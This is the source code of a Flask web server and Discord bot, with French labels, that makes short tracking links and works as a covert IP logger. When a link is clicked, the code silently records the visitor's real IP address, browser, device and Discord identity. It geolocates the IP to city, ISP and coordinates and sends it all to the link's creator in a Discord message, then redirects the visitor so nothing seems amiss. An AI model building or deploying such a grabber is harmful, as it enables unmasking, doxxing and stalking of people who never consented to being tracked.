import sqlite3
import string
import random
from flask import Flask, request, redirect
from datetime import datetime
from user_agents import parse
import asyncio
from threading import Lock
import discord
import requests
import re

app = Flask(__name__)
bot_instance = None
notify_lock = Lock()

def get_ip_geolocation(ip_address):
    try:
        response = requests.get(f'https://ipapi.co/{ip_address}/json/', timeout=5)
        if response.status_code == 200:
            data = response.json()
            return {
                'city': data.get('city', 'N/A'),
                'region': data.get('region', 'N/A'),
                'country': data.get('country_name', 'N/A'),
                'isp': data.get('org', 'N/A'),
                'latitude': data.get('latitude', 'N/A'),
                'longitude': data.get('longitude', 'N/A'),
                'timezone': data.get('timezone', 'N/A')
            }
    except:
        pass
    return None

def get_system_info(user_agent_str):
    os_info = "Inconnu"
    if 'Windows' in user_agent_str:
        if 'Windows NT 10.0' in user_agent_str:
            os_info = "Windows 10/11"
        elif 'Windows NT 6.3' in user_agent_str:
            os_info = "Windows 8.1"
        else:
            os_info = "Windows"
    elif 'Mac' in user_agent_str:
        os_info = "macOS"
    elif 'Linux' in user_agent_str:
        os_info = "Linux"
    elif 'Android' in user_agent_str:
        os_info = "Android"
    elif 'iPhone' in user_agent_str or 'iPad' in user_agent_str:
        os_info = "iOS"
    
    return os_info

def init_tracker_db():
    conn = sqlite3.connect("tracker.db")
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS tracker_links (
            link_id TEXT PRIMARY KEY,
            creator_id INTEGER,
            created_at TEXT,
            target_url TEXT,
            description TEXT
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS tracker_clicks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            link_id TEXT,
            user_id TEXT,
            ip_address TEXT,
            user_agent TEXT,
            browser TEXT,
            device_type TEXT,
            clicked_at TEXT,
            FOREIGN KEY(link_id) REFERENCES tracker_links(link_id)
        )
    ''')
    
    try:
        cursor.execute('ALTER TABLE tracker_clicks ADD COLUMN user_id TEXT')
    except:
        pass
    
    conn.commit()
    conn.close()

def generate_short_id(length=6):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def create_tracker_link(creator_id, target_url, description):
    link_id = generate_short_id()
    conn = sqlite3.connect("tracker.db")
    cursor = conn.cursor()
    
    cursor.execute('''
        INSERT INTO tracker_links (link_id, creator_id, created_at, target_url, description)
        VALUES (?, ?, ?, ?, ?)
    ''', (link_id, creator_id, datetime.now().isoformat(), target_url, description))
    
    conn.commit()
    conn.close()
    return link_id

def get_user_info(user_id):
    try:
        if not bot_instance:
            return None
        user = bot_instance.get_user(user_id)
        if user:
            return {
                'id': user.id,
                'name': user.name,
                'discriminator': user.discriminator,
                'avatar': str(user.avatar.url) if user.avatar else None,
                'created_at': user.created_at.isoformat()
            }
    except:
        pass
    return None

def get_tracker_stats(link_id, creator_id):
    conn = sqlite3.connect("tracker.db")
    cursor = conn.cursor()
    
    cursor.execute('SELECT creator_id FROM tracker_links WHERE link_id = ?', (link_id,))
    result = cursor.fetchone()
    
    if not result or result[0] != creator_id:
        conn.close()
        return None
    
    cursor.execute('''
        SELECT ip_address, browser, device_type, clicked_at, user_agent, user_id
        FROM tracker_clicks WHERE link_id = ?
        ORDER BY clicked_at DESC
    ''', (link_id,))
    
    clicks = cursor.fetchall()
    conn.close()
    
    return {
        'total_clicks': len(clicks),
        'clicks': clicks
    }

async def notify_discord(creator_id, link_id, user_id, ip_address, browser, device_type, user_agent_str):
    if not bot_instance:
        return
    
    try:
        creator = await bot_instance.fetch_user(creator_id)
        geo = get_ip_geolocation(ip_address)
        os_info = get_system_info(user_agent_str)
        
        embed = discord.Embed(
            title="🔔 Quelqu'un a cliqué sur ton lien!",
            color=discord.Color.green(),
            timestamp=datetime.now()
        )
        
        embed.add_field(name="👤 INFOS UTILISATEUR", value="‎", inline=False)
        if user_id:
            try:
                clicked_user = await bot_instance.fetch_user(int(user_id))
                embed.add_field(name="Nom", value=f"**{clicked_user.name}#{clicked_user.discriminator}**", inline=True)
                embed.add_field(name="Mention", value=f"{clicked_user.mention}", inline=True)
                embed.add_field(name="ID Discord", value=f"`{clicked_user.id}`", inline=True)
                embed.add_field(name="Compte créé", value=clicked_user.created_at.strftime("%d/%m/%Y %H:%M"), inline=True)
                if clicked_user.avatar:
                    embed.set_thumbnail(url=clicked_user.avatar.url)
            except:
                embed.add_field(name="Utilisateur", value="Non identifié", inline=False)
        else:
            embed.add_field(name="Utilisateur", value="❓ Anonyme", inline=False)
        
        embed.add_field(name="🌐 INFOS RÉSEAU", value="‎", inline=False)
        embed.add_field(name="IP Réelle", value=f"`{ip_address}`", inline=True)
        if geo:
            embed.add_field(name="Ville", value=geo['city'], inline=True)
            embed.add_field(name="Région", value=geo['region'], inline=True)
            embed.add_field(name="Pays", value=geo['country'], inline=True)
            embed.add_field(name="Fuseau horaire", value=geo['timezone'], inline=True)
            embed.add_field(name="Fournisseur Internet", value=geo['isp'], inline=True)
            embed.add_field(name="Coordonnées", value=f"Lat: {geo['latitude']}, Lng: {geo['longitude']}", inline=False)
        
        embed.add_field(name="💻 INFOS SYSTÈME", value="‎", inline=False)
        embed.add_field(name="Système d'exploitation", value=os_info, inline=True)
        embed.add_field(name="Navigateur", value=browser, inline=True)
        embed.add_field(name="Type d'appareil", value=device_type, inline=True)
        embed.add_field(name="User-Agent", value=f"```{user_agent_str[:120]}```", inline=False)
        
        embed.add_field(name="🕐 HEURE", value=datetime.now().strftime("%d/%m/%Y %H:%M:%S"), inline=False)
        embed.add_field(name="Lien ID", value=f"`{link_id}`", inline=True)
        
        await creator.send(embed=embed)
    except Exception as e:
        pass

@app.route('/track/<link_id>')
def track_click(link_id):
    user_agent_str = request.headers.get('User-Agent', 'Unknown')
    user_agent_obj = parse(user_agent_str)
    
    device_type = 'Mobile' if user_agent_obj.is_mobile else ('Tablet' if user_agent_obj.is_tablet else 'Desktop')
    browser = str(user_agent_obj.browser.family)
    
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ',' in ip_address:
        ip_address = ip_address.split(',')[0].strip()
    
    user_id = request.args.get('uid', None)
    
    conn = sqlite3.connect("tracker.db")
    cursor = conn.cursor()
    
    cursor.execute('SELECT target_url, creator_id FROM tracker_links WHERE link_id = ?', (link_id,))
    result = cursor.fetchone()
    
    if result:
        target_url, creator_id = result
        cursor.execute('''
            INSERT INTO tracker_clicks (link_id, user_id, ip_address, user_agent, browser, device_type, clicked_at)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (link_id, user_id, ip_address, user_agent_str, browser, device_type, datetime.now().isoformat()))
        
        conn.commit()
        conn.close()
        
        if bot_instance:
            try:
                asyncio.run_coroutine_threadsafe(
                    notify_discord(creator_id, link_id, user_id, ip_address, browser, device_type, user_agent_str),
                    bot_instance.loop
                )
            except:
                pass
        
        return redirect(target_url)
    
    conn.close()
    return "Lien non trouvé", 404

def run_server(bot=None):
    global bot_instance
    bot_instance = bot
    init_tracker_db()
    app.run(host='0.0.0.0', port=5000, debug=False)
